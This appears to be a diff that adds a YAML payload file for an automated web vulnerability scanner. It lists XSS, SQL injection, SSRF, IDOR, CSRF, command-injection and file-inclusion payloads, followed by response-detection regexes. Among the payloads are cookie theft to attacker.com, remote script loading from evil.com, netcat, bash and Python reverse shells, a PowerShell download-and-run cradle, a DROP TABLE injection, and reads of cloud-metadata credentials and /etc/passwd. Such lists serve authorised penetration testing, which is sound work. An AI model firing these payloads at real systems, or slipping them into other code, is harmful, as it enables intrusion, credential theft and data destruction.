@@ -1,0 +1,258 @@
+# Comprehensive Payload Configuration for Cybersecurity Testing
+# This file contains rule-based payloads used when AI mode is disabled
+# Edit these payloads to customize testing without code changes
+
+xss_payloads:
+  basic:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg onload=alert('XSS')>"
+    - "javascript:alert('XSS')"
+    - "<iframe src=javascript:alert('XSS')></iframe>"
+    - "<body onload=alert('XSS')>"
+    - "<input onfocus=alert('XSS') autofocus>"
+    - "<select onfocus=alert('XSS') autofocus>"
+    
+  advanced:
+    - "<script>fetch('https://attacker.com/steal?data='+document.cookie)</script>"
+    - "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>"
+    - "<svg/onload=\\u0061lert('XSS')>"
+    - "<script>setTimeout('alert(\"XSS\")',1000)</script>"
+    - "';alert('XSS');//"
+    - "<script>var a=document.createElement('script');a.src='https://evil.com/xss.js';document.head.appendChild(a)</script>"
+    - "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">"
+    - "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">"
+    
+  context_specific:
+    url_param:
+      - "javascript:alert('XSS')"
+      - "data:text/html,<script>alert('XSS')</script>"
+      - "vbscript:msgbox('XSS')"
+      
+    form_field:
+      - "<script>alert('XSS')</script>"
+      - "\"><script>alert('XSS')</script>"
+      - "'><script>alert('XSS')</script>"
+      - "</textarea><script>alert('XSS')</script>"
+      
+    json_field:
+      - "\",\"xss\":\"<script>alert('XSS')</script>"
+      - "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e"
+      
+    attribute:
+      - "\" onmouseover=alert('XSS') \""
+      - "' onclick=alert('XSS') '"
+      - "\" autofocus onfocus=alert('XSS') \""
+
+sqli_payloads:
+  basic:
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - "\" OR \"1\"=\"1"
+    - "' UNION SELECT 1,2,3--"
+    - "'; DROP TABLE users;--"
+    - "' OR 'a'='a"
+    - "1' OR '1'='1"
+    - "admin'--"
+    
+  advanced:
+    - "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--"
+    - "' OR (SELECT user FROM mysql.user WHERE user='root')='root'--"
+    - "1'; WAITFOR DELAY '00:00:05'--"
+    - "' OR SLEEP(5)--"
+    - "1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))--"
+    - "' UNION SELECT table_name FROM information_schema.tables--"
+    - "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    - "1' AND ROW(1,1) > (SELECT COUNT(*), CONCAT(CONCAT(@@version), 0x3a, 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.columns GROUP BY x LIMIT 1)--"
+    
+  blind:
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "' AND (SELECT LENGTH(user()))>0--"
+    - "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--"
+    - "' AND (SELECT COUNT(*) FROM users)>0--"
+    - "1' AND SUBSTRING(user(),1,1)='r'--"
+    - "' AND IFNULL(1/0, 'true')='true'--"
+    
+  time_based:
+    - "'; WAITFOR DELAY '00:00:05'--"
+    - "' OR SLEEP(5)--"
+    - "'; pg_sleep(5)--"
+    - "' AND (SELECT * FROM (SELECT SLEEP(5))A)--"
+    - "1'; SELECT SLEEP(5)--"
+
+ssrf_payloads:
+  basic:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://localhost:22"
+    - "http://127.0.0.1:80"
+    - "file:///etc/passwd"
+    - "gopher://127.0.0.1:25"
+    - "http://169.254.169.254/"
+    - "http://[::1]:80"
+    - "http://0.0.0.0:22"
+    
+  cloud_metadata:
+    - "http://169.254.169.254/latest/meta-data/instance-id"
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://169.254.169.254/metadata/v1/"
+    - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    - "http://metadata.google.internal/computeMetadata/v1/instance/"
+    - "http://metadata.google.internal/computeMetadata/v1/project/"
+    
+  internal_services:
+    - "http://localhost:3306"  # MySQL
+    - "http://localhost:5432"  # PostgreSQL
+    - "http://localhost:6379"  # Redis
+    - "http://localhost:9200"  # Elasticsearch
+    - "http://localhost:27017" # MongoDB
+    - "http://localhost:8080"  # Common web services
+    - "http://localhost:9000"  # Common admin interfaces
+
+idor_payloads:
+  numeric:
+    - "1"
+    - "2"
+    - "0"
+    - "-1"
+    - "999999"
+    - "100"
+    - "1000"
+    - "00001"
+    
+  guid:
+    - "00000000-0000-0000-0000-000000000000"
+    - "admin"
+    - "root"
+    - "administrator"
+    - "test"
+    - "guest"
+    - "11111111-1111-1111-1111-111111111111"
+    
+  paths:
+    - "../"
+    - "../../"
+    - "/admin/"
+    - "/user/1/"
+    - "../admin"
+    - "../../etc/passwd"
+    - "/etc/passwd"
+
+csrf_tokens:
+  # Invalid/missing CSRF tokens to test CSRF protection
+  - ""
+  - "invalid_token"
+  - "12345"
+  - "null"
+  - "undefined"
+  - "fake_csrf_token"
+  - "abcdef123456"
+  - "00000000000000000000000000000000"
+
+command_injection:
+  basic:
+    - "; ls -la"
+    - "| whoami"
+    - "`id`"
+    - "$(whoami)"
+    - "&& cat /etc/passwd"
+    - "; ping -c 4 attacker.com"
+    - "| cat /etc/passwd"
+    - "& dir"
+    
+  advanced:
+    - "; curl http://attacker.com/$(whoami)"
+    - "| nc attacker.com 4444 -e /bin/sh"
+    - "; python -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+    - "| powershell -exec bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://attacker.com/shell.ps1')\""
+    - "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    
+  windows:
+    - "& dir"
+    - "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
+    - "& whoami"
+    - "| powershell Get-Process"
+    - "& systeminfo"
+
+lfi_payloads:
+  basic:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "/etc/passwd"
+    - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    - "file:///etc/passwd"
+    
+  advanced:
+    - "....//....//....//etc/passwd"
+    - "..%2F..%2F..%2Fetc%2Fpasswd"
+    - "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
+    - "/proc/version"
+    - "/proc/self/environ"
+    - "C:\\Windows\\win.ini"
+    - "C:\\boot.ini"
+
+# Heuristic detection patterns
+detection_heuristics:
+  xss:
+    reflection_indicators:
+      - "payload_in_response"
+      - "script_tag_executed"
+      - "event_handler_executed"
+      
+    execution_patterns:
+      - "<script[^>]*>.*?</script>"
+      - "<img[^>]*onerror[^>]*>"
+      - "<svg[^>]*onload[^>]*>"
+      - "javascript:"
+      - "alert\\s*\\("
+      - "eval\\s*\\("
+      
+  sqli:
+    error_patterns:
+      - "SQL syntax.*MySQL"
+      - "Warning.*mysql_.*"
+      - "postgresql.*error"
+      - "ORA-\\d{5}"
+      - "Microsoft.*ODBC.*Driver"
+      - "SQLite.*error"
+      - "sqlite3\\.OperationalError"
+      - "SQLSTATE\\["
+      
+  ssrf:
+    aws_metadata_indicators:
+      - "ami-id"
+      - "instance-id"
+      - "public-hostname"
+      - "security-groups"
+      - "iam/security-credentials"
+      
+    service_banners:
+      - "SSH-\\d+\\.\\d+"
+      - "220.*SMTP"
+      - "HTTP/1\\.[01] \\d{3}"
+      - "root:x:\\d+:"
+      
+  command_injection:
+    output_patterns:
+      - "uid=\\d+.*gid=\\d+"
+      - "total \\d+"
+      - "root.*bin.*daemon"
+      - "PING.*bytes of data"
+      - "\\.{1,2}:.*\\n.*\\$"
+
+# Payload categories for different vulnerability types
+vulnerability_mapping:
+  xss:
+    - "xss_payloads"
+  sql_injection:
+    - "sqli_payloads"
+  ssrf:
+    - "ssrf_payloads"
+  idor:
+    - "idor_payloads"
+  csrf:
+    - "csrf_tokens"
+  command_injection:
+    - "command_injection"
+  lfi:
+    - "lfi_payloads"
